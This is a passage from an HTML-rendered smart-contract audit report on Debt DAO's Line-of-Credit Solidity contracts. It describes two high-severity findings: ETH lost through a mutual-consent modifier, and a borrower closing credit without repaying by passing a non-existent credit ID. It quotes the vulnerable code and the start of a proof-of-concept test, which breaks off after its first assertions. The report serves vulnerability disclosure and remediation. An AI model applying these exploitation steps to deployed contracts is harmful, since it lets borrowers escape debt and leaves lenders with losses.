13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/125\">[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/125\">Lambda</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/471\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/430\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/351\">minhquanym</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/325\">adriro</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/42\">HE1M</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234\">https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270\">https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270</a></p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The functions <code>addCredit</code> and <code>increaseCredit</code> both ahve a <code>mutualConsent</code> or <code>mutualConsentById</code> modifier. Furthermore, these functions are <code>payable</code> and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mutualConsent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signerOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signerTwo</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_mutualConsent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_signerOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_signerTwo</span><span class=\"mtk1\">))  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Run whatever code needed 2/2 consent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_mutualConsent</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signerOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_signerTwo</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_signerOne</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_signerTwo</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Unauthorized</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nonCaller</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getNonCaller</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_signerOne</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_signerTwo</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The consent hash is defined by the hash of the transaction call data and sender of msg,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// which uniquely identifies the function, arguments, and sender.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nonCaller</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">mutualConsents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">expectedHash</span><span class=\"mtk1\">]) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newHash</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">mutualConsents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">newHash</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MutualConsentRegistered</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mutualConsents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">expectedHash</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.</p>\n<p>This is very problematic in combination with sending ETH for two reasons:</p>\n<ol>\n<li>When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.</li>\n<li>Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.</li>\n</ol>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>Lender Alice calls <code>LineOfCredit.addCredit</code> first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/125\">dmvt (judge) increased severity to High</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/125\">kibagateaux (Debt DAO) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-04-borrower-can-close-a-credit-without-repaying-debt\" style=\"position:relative;\"><a href=\"#h-04-borrower-can-close-a-credit-without-repaying-debt\" aria-label=\"h 04 borrower can close a credit without repaying debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/258\">[H-04] Borrower can close a credit without repaying debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/258\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/527\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/472\">berndartmueller</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/394\">smiling_heretic</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/334\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/298\">hansfriese</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/272\">bin2chen</a></em></p>\n<p>A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The <code>close</code> function of <code>LineOfCredit</code> doesn’t check whether a credit exists or not. As a result, the <code>count</code> variable is decreased in the internal <code>_close</code> function when the <code>close</code> function is called with an non-existent credit ID:\n<a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\">LineOfCredit.sol#L388</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">borrower</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// gas savings</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lender</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">b</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CallerAccessDenied</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_accrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">facilityFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestAccrued</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">facilityFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// only allow repaying interest since they are skipping repayment queue.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// If principal still owed, _close() MUST fail</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">receiveTokenOrETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">b</span><span class=\"mtk1\">, </span><span class=\"mtk12\">facilityFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">credit</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_repay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">facilityFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">id</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// deleted; no need to save to storage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483\">LineOfCredit.sol#L483</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_close</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Credit</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">principal</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CloseFailedWithPrincipal</span><span class=\"mtk1\">(); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// return the Lender&#39;s funds that are being repaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sendOutTokenOrETH</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">credit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">interestRepaid</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">credits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">]; </span><span class=\"mtk3\">// gas refunds</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// remove from active list</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">.</span><span class=\"mtk11\">removePosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { --</span><span class=\"mtk12\">count</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// If all credit lines are closed the the overall Line of Credit facility is declared &#39;repaid&#39;.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">count</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) { </span><span class=\"mtk11\">_updateStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LineLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">STATUS</span><span class=\"mtk1\">.</span><span class=\"mtk12\">REPAID</span><span class=\"mtk1\">); }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CloseCreditPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Proof of Concept:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// contracts/tests/LineOfCredit.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testCloseWithoutRepaying_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">supportedToken1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">line</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Line balance should be 0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span 